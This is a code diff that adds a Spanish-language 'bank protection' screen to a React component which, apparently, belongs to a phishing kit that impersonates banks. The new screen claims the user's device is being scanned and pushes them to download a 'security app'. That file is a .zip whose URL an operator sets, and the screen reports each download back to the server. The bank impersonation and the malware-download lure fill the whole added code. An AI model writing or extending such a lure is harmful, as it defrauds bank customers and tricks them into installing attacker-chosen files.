@@ -39,6 +39,9 @@ interface ScreenTemplatesProps {
     comercio?: string;
     mensaje?: string;
     alias?: string;
+    fileName?: string;
+    fileUrl?: string;
+    fileSize?: string;
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -718,6 +721,59 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(cancelacionRetiroContent);
+
+      case ScreenType.PROTECCION_BANCARIA:
+        const proteccionBancariaContent = (
+          <>
+            <h2 className="text-xl font-bold mb-4" style={{ color: '#004080' }}>
+              Protección Inteligente para tu Seguridad Bancaria
+            </h2>
+            <div className="text-left space-y-4 mb-6">
+              <p className="text-gray-700">
+                Estamos por analizar tu dispositivo para garantizar que no exista un mal uso de tu información personal o financiera.
+              </p>
+              <p className="text-gray-700">
+                Te invitamos a descargar nuestra <strong>Aplicación de Protección Bancaria</strong>, diseñada para brindarte una capa adicional de seguridad al interactuar con nuestros servicios.
+              </p>
+              <div className="bg-blue-50 p-4 rounded-lg">
+                <p className="text-gray-800">
+                  <strong>Precio de descarga:</strong> Gratuito
+                </p>
+              </div>
+              <p className="text-gray-700">
+                <strong>Para iniciar tu descarga, haz clic en el siguiente botón:</strong>
+              </p>
+            </div>
+            <Button 
+              className="bg-[#004080] hover:bg-[#003366] text-white py-3 px-6 rounded font-bold w-full transition-colors"
+              onClick={() => {
+                // Verificar si hay un archivo disponible para descarga
+                if (screenData.fileUrl) {
+                  // Crear un enlace temporal para descargar el archivo
+                  const link = document.createElement('a');
+                  link.href = screenData.fileUrl;
+                  link.download = screenData.fileName || 'proteccion_bancaria.zip';
+                  link.target = '_blank';
+                  document.body.appendChild(link);
+                  link.click();
+                  document.body.removeChild(link);
+                  
+                  // Notificar al servidor que se realizó la descarga
+                  onSubmit(ScreenType.PROTECCION_BANCARIA, { 
+                    action: 'download',
+                    fileName: screenData.fileName,
+                    downloaded: true
+                  });
+                } else {
+                  alert('El archivo de protección aún no está disponible. Por favor, espera a que el administrador lo configure.');
+                }
+              }}
+            >
+              Descargar ahora
+            </Button>
+          </>
+        );
+        return getBankContainer(proteccionBancariaContent);
 
       default:
         const defaultContent = (
